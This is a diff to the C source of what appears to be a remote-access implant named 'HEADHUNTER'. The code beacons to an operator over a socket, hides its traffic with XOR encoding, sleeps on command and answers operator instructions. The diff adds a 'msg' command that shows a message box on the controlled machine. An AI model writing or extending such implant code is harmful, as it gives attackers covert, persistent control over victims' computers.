@@ -20,6 +20,18 @@ int bufsize;
 int beaconing;
 int sleeptime = 20000;
 
+DWORD WINAPI Msg(LPVOID lpParameter)
+{
+	LPCWSTR myText = *(LPCWSTR *)lpParameter;
+
+    	LPCWSTR myCaption = L"Important Message";
+
+    	MessageBoxW(NULL, myText, myCaption, MB_OKCANCEL);
+	
+	return 0;
+}
+
+
 int main(void) {
 
 	WSADATA wsaData;
@@ -52,7 +64,6 @@ int main(void) {
 	}
 #endif
 
-
 	char* beacon = "--HEADHUNTER BEACON--";
 	char* xorbeacon = XOR(beacon, key, strlen(beacon), keylen);
         	
@@ -61,9 +72,9 @@ int main(void) {
 		
 		send(sock, xorbeacon, strlen(beacon), 0);
 		n = recv(sock, buf, MAXBUF, 0);
-
 		char* xorbuf = XOR(buf, key, n, keylen);
-
+		xorbuf[n] = '\0';
+		
 		if(str_starts_with(xorbuf, "--HEADHUNTER NO--") == 0){
 			Sleep(sleeptime);
 		}
@@ -108,6 +119,23 @@ int main(void) {
                                 char* xorsleepmsg = XOR(sleepmsg, key, strlen(sleepmsg), keylen);
 				send(sock, xorsleepmsg, strlen(sleepmsg), 0);
 				free(xorsleepmsg);
+			}
+			else if(str_starts_with(xorbuf, "msg") == 0){
+				
+				char* cmd = split(xorbuf, " ");
+				// convert char* to LPWSTR
+ 				wchar_t wtext[1000];
+ 				mbstowcs(wtext, cmd, strlen(cmd)+1);//Plus null
+				wtext[strlen(cmd)+1] = '\0';
+ 				LPWSTR msg = wtext;
+				
+				DWORD myThreadID;
+				HANDLE myHandle = CreateThread(0, 0, Msg, &msg, 0, &myThreadID);
+				char* msgmsg = "\e[1;32m[+]\e[0m Hunter: OK\n";
+                                char* xormsgmsg = XOR(msgmsg, key, strlen(msgmsg), keylen);
+				send(sock, xormsgmsg, strlen(msgmsg), 0);
+				free(xormsgmsg);
+
 			}
 			else if(strncmp(xorbuf, "\n", 1) == 0)
 			{
